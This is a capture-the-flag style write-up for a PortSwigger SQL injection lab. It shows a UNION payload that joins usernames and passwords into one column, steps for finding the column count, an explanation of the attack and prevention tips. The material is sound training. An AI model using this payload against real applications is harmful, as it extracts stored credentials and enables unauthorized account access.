SQL Injection: Retrieving Multiple Values in a Single Column (UNION)

Category: SQL Injection
Difficulty: Practitioner
Lab Link: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

---

Vulnerability

The application is vulnerable to SQL injection via the "category" parameter.
The query returns only one column, so multiple values must be combined into a single column.

---

Payload

' UNION SELECT username || '~' || password FROM users--

---

Exploitation Steps

1. Navigate to a product category.

2. Determine the number of columns:

' UNION SELECT NULL--

→ The query returns 1 column

3. Combine multiple values into a single column using concatenation:

' UNION SELECT username || '~' || password FROM users--

4. The application displays combined values:

username:password

5. Use the administrator credentials to log in.

---

Why the Attack Works

- The original query returns only one column
- UNION requires matching column count
- Multiple values are combined using concatenation ("||")

This allows extraction of multiple fields within a single column.

---

Prevention

- Use parameterized queries
- Avoid direct SQL query construction using user input
- Implement strict input validation
